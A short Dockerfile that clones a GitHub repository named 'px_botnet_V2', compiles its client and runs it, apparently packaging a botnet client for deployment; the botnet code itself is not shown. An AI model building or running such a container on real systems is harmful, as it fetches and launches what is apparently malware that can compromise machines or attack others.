FROM debian:latest

RUN apt update && apt install -y gcc make git

RUN git clone https://github.com/PandeoF1/px_botnet_V2.git

WORKDIR /px_botnet_V2/client/

RUN make

CMD ["/client"]